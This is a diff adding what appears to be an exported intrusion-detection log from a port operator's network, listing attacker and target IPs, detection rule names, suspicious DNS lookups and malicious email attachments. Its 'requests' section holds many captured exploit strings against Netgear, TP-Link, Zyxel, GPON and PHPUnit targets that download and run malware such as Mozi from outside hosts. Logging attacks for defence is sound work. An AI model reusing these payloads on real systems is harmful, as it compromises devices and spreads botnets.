@@ -1,0 +1,196 @@
+ATTACKS DATA/Exploit Attemops
+
+
+SourceIP Attacks
+
+None
+124.165.198.25
+176.97.210.236
+10.88.56.113
+84.54.51.37
+117.204.199.189
+180.250.18.247
+125.40.2.239
+182.116.69.8
+103.174.36.67
+159.223.54.169
+116.25.39.121
+79.170.24.211
+27.157.170.234
+120.86.255.54
+221.118.60.138
+115.50.231.73
+112.94.97.188
+134.209.147.221
+157.245.206.184
+128.199.71.192
+103.186.161.60
+139.59.100.61
+103.153.3.242
+4.157.252.173
+157.230.255.137
+157.230.44.19
+178.128.218.82
+125.164.11.229
+96.126.110.54
+
+
+Destination IP
+
+None
+10.0.10.13
+10.0.157.10
+10.0.127.214
+10.0.127.120
+10.0.127.93
+10.0.127.186
+10.0.127.95
+10.0.127.19
+10.0.127.170
+10.0.127.65
+10.0.127.98
+10.0.127.108
+10.0.127.226
+10.0.127.167
+10.0.147.23
+10.0.127.39
+10.0.127.122
+10.0.127.87
+10.0.127.225
+10.0.127.80
+10.0.127.51
+10.0.127.123
+10.0.127.124
+
+
+ruleNames
+
+Unix - Syslog
+CVE-2017-9841 - PHPUnit Remote Code Execution Exploit - HTTP (Request)
+Web Server - Apache
+Command Injection Exploit Sensor - HTTP (Request) - Variant 2
+Wget Commandline Injection
+CVE-2018-10562 - GPON Remote Code Execution - HTTP (Request)
+Remote Code Execution - HTTP (Request) - Variant 2
+NETGEAR DGN1000/DGN2200 Remote Code Execution - HTTP (Request)
+Possible Directory Traversal Exploit Attempted - URI Variable/URI Path - HTTP (Request)
+Possible Directory Traversal Exploit Attempted SENSOR - HEADERS - HTTP (Request)
+ThinkPHP 5x Remote Code Execution - HTTP (Request)
+UNIX IFS SHELL RCE - HTTP (Request)
+Invalid Traversal
+HNAP1 Remote Code Execution Exploit - HTTP (Request)
+HNAP1 - RCE - HTTP (Request)
+Web Server - Apache - 2
+
+
+requests
+
+
+https://127.0.0.1:80/GponForm/diag_Form?images/
+https://pelindo.co.id/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+https://www.pelindo.co.id/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+https://103.41.110.110:80/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.40.2.239:51877/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+https://103.41.110.110:80/index.php?lang=../../../../../../../../tmp/index1
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.204.199.189:40789/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>+cd+%2Ftmp+wget+http%3A%2F%2F147.78.103.184%2Fr%3B+curl+-O+http%3A%2F%2F147.78.103.184%2Fr%3B+chmod+%2Bx+r%3B+.%2Fr%20scanner.tplink)
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.50.231.73:34721/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://116.25.39.121:34807/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+https://103.41.110.110/index.php?lang=../../../../../../../../tmp/index1
+https://103.41.110.39:80/HNAP1/
+/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.180.149.156/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;
+/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>+cd+%2Ftmp+wget+http%3A%2F%2F147.78.103.184%2Fr%3B+curl+-O+http%3A%2F%2F147.78.103.184%2Fr%3B+chmod+%2Bx+r%3B+.%2Fr%20tplink)
+https://103.41.110.110:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+https://103.41.110.20:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F176.97.210.238%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+https://103.41.110.110:80/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+https://103.41.110.110:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F176.97.210.240%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+https://103.41.110.44:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F176.97.210.240%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+https://103.41.110.123:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F176.97.210.238%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+https://103.41.110.141:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F176.97.210.240%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+https://spinerrb.pelindo.co.id/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+https://103.41.110.33:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F176.97.210.238%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+https://103.41.110.105:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F176.97.210.240%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+https://103.41.110.72:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F176.97.210.240%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+https://www-dev.pelindo.co.id/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+https://103.41.110.37:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F176.97.210.240%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+https://103.41.110.91:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F176.97.210.240%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+https://103.41.110.23:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F176.97.210.240%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+Suspicious DNS Response
+
+
+SourceIP Attacks
+
+10.0.127.81
+10.0.127.82
+1.1.1.1
+8.8.8.8
+
+
+Destination IP
+
+10.40.5.201
+10.7.3.148
+10.5.11.100
+10.2.15.110
+10.2.15.10
+10.3.19.54
+10.2.25.217
+10.2.71.69
+10.2.71.77
+10.2.237.19
+10.3.19.100
+10.2.71.94
+10.2.4.25
+10.2.4.43
+10.5.11.203
+10.0.127.82
+10.2.239.153
+10.2.71.55
+10.3.21.222
+10.2.15.6
+10.0.127.81
+10.3.3.101
+10.2.6.132
+10.2.239.195
+10.5.5.168
+10.17.3.25
+10.2.239.171
+10.2.232.100
+10.17.3.24
+10.17.3.32
+
+
+ruleNames
+
+Anydesk RMM - DNS (Response) - Beta
+DNS response of a queried malware Command and Control domain
+Possible CONFICKER DNS Response
+
+
+requests
+
+boot.net.anydesk.com
+ilo.brenz.pl
+fzgrpqktmq.com
+gtxvdqvuweqs.com
+Malware Reports
+
+
+endpointName
+
+
+mailstore.inaport4.co.id
+mta-2.inaport4.co.id
+mta-1.inaport4.co.id
+
+
+fileNames
+
+
+13379-18216.msg(RFQ-NCP45540IMNTWG-H-COMPO  (3000 per reel).img)
+13378-18215.msg(RFQ-NCP45540IMNTWG-H-COMPO  (3000 per reel).img)
+11554-16391.msg(Form - 07 Jun, 2022.zip(Form - 07 Jun, 2022.xls))
+18fd9401c72-7885(RFQ-NCP45540IMNTWG-H-COMPO  (3000 per reel).img)
+18fd9401c72-7886(RFQ-NCP45540IMNTWG-H-COMPO  (3000 per reel).img)
+18fd940221f-7885(RFQ-NCP45540IMNTWG-H-COMPO  (3000 per reel).img)
+18fd940221f-7886(RFQ-NCP45540IMNTWG-H-COMPO  (3000 per reel).img)
